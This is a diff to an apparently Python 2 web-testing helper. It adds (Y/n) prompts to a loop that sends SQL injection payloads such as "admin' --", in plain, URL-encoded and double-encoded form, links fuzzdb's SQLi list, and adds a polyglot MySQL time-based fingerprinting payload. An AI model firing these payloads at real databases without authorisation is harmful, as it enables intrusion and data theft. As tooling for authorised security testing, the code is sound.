@@ -131,6 +131,7 @@ def try_default_SQLi_tests(func):
     ' or 1=1/* 
     ') or '1'='1-- 
     ') or ('1'='1-- 
+    TODO add those payloads? https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection
     '''
     payloads = [
         "admin' --",
@@ -173,14 +174,14 @@ def try_default_SQLi_tests(func):
         "4-1" #Should be id=3
     ]
     for payload in payloads:
-        if raw_input("Run payload? (Payload: [" + payload + "]) ").lower() != 'n':
+        if raw_input("Run payload (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
             func(payload)
             show_success_or_danger()
     for payload in payloads:
-        if raw_input("Run payload url encoded? (Payload: [" + payload + "]) ").lower() != 'n':
+        if raw_input("Run payload url encoded (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
             func(urllib.quote_plus(payload))
             show_success_or_danger()
-        if raw_input("Run payload url encoded twice? (Payload: [" + payload + "]) ").lower() != 'n':
+        if raw_input("Run payload url encoded twice (Y/n)? (Payload: [" + payload + "]) ").lower() != 'n':
             func(urllib.quote_plus(urllib.quote_plus(payload)))
             show_success_or_danger()
 
@@ -190,10 +191,11 @@ def __enum(**enums):
 DBMS = __enum(MySQL="MYSQL",PostgreSQL="POSTGRESQL",SQLite="SQLITE",MSSQL="MSSQL")
 
 #https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint
+#https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
 def dbms_detection_values(dbms):
     print("\nYou can also refer to: https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint\n")
     if dbms == DBMS.MySQL:
-        array = ["sleep(5)", "CONCAT('a','a')"]
+        array = ["sleep(5)", "CONCAT('a','a')", "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/"]
         print ', '.join(array)
         return array
     if dbms == DBMS.PostgreSQL:
